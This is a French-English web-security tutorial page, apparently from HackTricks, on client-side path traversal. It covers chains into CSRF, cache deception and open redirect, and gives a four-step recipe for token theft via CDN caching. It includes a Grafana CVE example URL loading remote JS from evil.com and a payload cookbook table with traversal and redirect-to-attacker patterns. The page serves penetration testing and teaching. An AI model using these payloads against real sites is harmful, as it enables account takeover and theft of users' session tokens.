# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Informations de base

A client side path traversal se produit lorsque vous pouvez **manipuler le chemin d'une URL** qui va être **envoyée à un utilisateur pour être visitée de façon légitime** ou qu'un utilisateur va être **forcé de visiter par exemple via JS ou CSS**. CSPT est aussi connu sous le nom **On-Site Request Forgery (OSRF)** car il permet de contraindre le navigateur de la victime à frapper des chemins arbitraires sur la même origine avec leurs cookies, JWTs, ou certificats mTLS.

Sources typiques (données que vous contrôlez) :

- Paramètres de route qui sont concaténés dans des chemins `fetch()` ou XHR (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Valeurs stockées (slugs de profil, ID de document) qui sont interpolées dans des chemins à l'intérieur de background jobs, service workers, ou WebSocket URLs.
- Gadgets UI (boutons download/export, galeries d'images) qui ajoutent des fragments contrôlés par l'utilisateur ou des extensions de fichier aux endpoints API avant l'envoi de la requête.

Typical sinks (where the traversal lands) :

- Frontend API wrappers qui préfixent `/api/` ou `/proxy/` et réutilisent automatiquement les en-têtes d'auth.
- `history.pushState` / `router.navigate` helpers qui reconstruisent les URLs plus tard lors de l'hydration.
- `<link>`/`<style>`/`@import` statements générés par du contenu CMS ou des feature-flag payloads.

### Impacts et chaînes courants

- **CSPT ➜ CSRF/OSRF** : détourner des appels authentifiés `POST/PUT/DELETE` en échappant le chemin de ressource prévu, puis réentrer des endpoints sensibles (password reset, payment approval, access revocation). Combinez avec la checklist [CSRF](csrf-cross-site-request-forgery.md) pour escalader.
- **CSPT ➜ cache deception / poisoning** : servir du JSON contrôlé par l'attaquant depuis des clés CDN publiques et le rejouer sans authentification. Voir [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF** : le traversal aboutit sur un endpoint open redirect, qui rebondit ensuite vers une infrastructure attaquante servant du JS malveillant ou des payloads SSRF. Enchaînez avec les abus [Open Redirect](open-redirect.md).

### Exemples de découvertes

- In [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), il était possible de **changer l'invite URL** pour qu'elle finisse par **annuler une carte**.
- In [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), il était possible de combiner un **client side path traversal via CSS** (il était possible de changer le chemin depuis lequel une ressource CSS était chargée) avec un **open redirect** pour charger la ressource CSS depuis un **domaine contrôlé par l'attaquant**.
- In [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), on peut voir une technique expliquant comment abuser CSPT **pour effectuer une attaque CSRF**. Ceci se fait en **monitorant toutes les données** qu'un attaquant peut contrôler (chemin URL, paramètres, fragment, données injectées en base...) **et les sinks** où ces données aboutissent (requêtes effectuées).
- Check [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) pour monitorer cela.
- Check this [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) pour essayer la technique.
- Check [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) sur comment utiliser l'extension de navigateur dans le playground.

## CSPT-assisted web cache poisoning/deception

CSPT can be chained with extension-based CDN caching to exfiltrate sensitive JSON leaked by authenticated API calls:

- A frontend concatenates user-controlled input into an API path and attaches authentication headers in fetch/XHR.
- By injecting dot-segments (../) you can retarget the authenticated request to a different endpoint on the same origin.
- If that endpoint (or a path variant with a static-looking suffix like .css) is cached by the CDN without varying on auth headers, the victim’s authenticated response can be stored under a public cache key and retrieved by anyone.

Recette rapide :

1) Trouver du code SPA construisant des URLs API à partir de paramètres de chemin tout en envoyant des en-têtes d'auth.
2) Identifier des endpoints sensibles et tester des suffixes statiques (.css, .js, .jpg, .json) pour voir si le CDN bascule en Cache-Control: public/max-age et X-Cache: Hit tout en retournant du JSON.
3) Appâter la victime vers une URL qui injecte une traversal dans le paramètre SPA afin que le fetch authentifié frappe la variante de chemin cacheable (par exemple, ../../../v1/token.css).
4) Relire la même URL anonymement pour obtenir le secret mis en cache (token → ATO).

Voir les détails et les mitigations dans la page Cache Deception : [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Hunting workflow & tooling

### Découverte passive avec des proxies d'interception

- **Correlate sources/sinks automatically** : l'[CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) parse votre historique proxy, regroupe les paramètres qui sont ensuite reflétés à l'intérieur des chemins d'autres requêtes, et peut réémettre des URLs proof-of-concept avec des canary tokens pour confirmer des traversals exploitables. Après avoir chargé le JAR, réglez le `Source Scope` sur les paramètres client (par ex., `id`, `slug`) et les `Sink Methods` sur `GET, POST, DELETE` pour que l'extension mette en évidence les constructeurs de requêtes dangereux. Vous pouvez exporter toutes les sources suspectes avec un canary embarqué pour les valider en masse.
- **Look for double-URL-decoding** : en naviguant avec Burp ou ZAP, surveillez les patterns `/api/%252e%252e/` qui sont normalisés par le frontend avant d'atteindre le réseau — ceux-ci apparaissent généralement comme des bodies JSON encodés en base64 référant l'état de la route et sont faciles à manquer sans un scanner automatisé.

### Instrumenting SPA sinks manually

Insérer un court snippet dans DevTools aide à faire remonter les traversals cachés pendant que vous interagissez avec l'UI :
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Ajoutez des wrappers similaires autour de `XMLHttpRequest.prototype.open`, `history.pushState`, et des routers spécifiques aux frameworks (p. ex. `next/router`). Surveiller `init.credentials === "include"` permet de cibler rapidement les requêtes qui transportent des cookies de session.
- Si l'app stocke des indices de routing dans IndexedDB/localStorage, modifiez ces entrées avec des payloads de traversal et rechargez — l'état muté est souvent réinjecté dans les requêtes avant l'hydratation.

### Laboratoire & répétition des payloads

- Démarrez le CSPT Playground via `docker compose up` et entraînez-vous à chaîner traversal ➜ CSRF ➜ stored XSS sans toucher la cible. Reproduire localement la structure du router de la cible facilite la création de PoCs partageables.
- Conservez un carnet des variations de dot-segment réussies (`..;/`, `%2e%2e/`, `%2e./%2e/`, homoglyphes UTF-8) et des astuces de suffixe (`.css`, `.json`, `;` params matrice) observées pendant la reconnaissance pour pouvoir les rejouer rapidement quand un nouveau sink apparaît.

## Études de cas récentes (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – Un traversal gadget à l'intérieur de `/public/plugins/` permettait aux attaquants d'introduire `../../` dans le plugin asset loader, de le chaîner avec l'open redirect de Grafana, et de forcer les victimes à charger des bundles de plugins contrôlés par l'attaquant. Lorsque les anonymous dashboards étaient activés, une URL construite comme `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` entraînait l'exécution de JavaScript distant dans le navigateur ; si le Image Renderer plugin était installé, le même primitive pouvait être transformé en SSRF en redirigeant les requêtes de rendu vers des hôtes internes. Testez toujours ensemble les plugin asset paths, anonymous dashboards et renderer endpoints car un seul traversal donne souvent à la fois des vecteurs XSS et SSRF.

## Payload cookbook

| Objectif | Pattern de payload | Remarques |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Works when routers simply concatenate `/${doc}`. Add `.json` if CDN only caches static-looking assets. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Combine with trusted redirectors listed in target’s codebase. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN may treat `.css` as static and cache secrets returned as JSON. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Some routers accept `_method` overrides; pair with traversal to re-target destructive endpoints. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
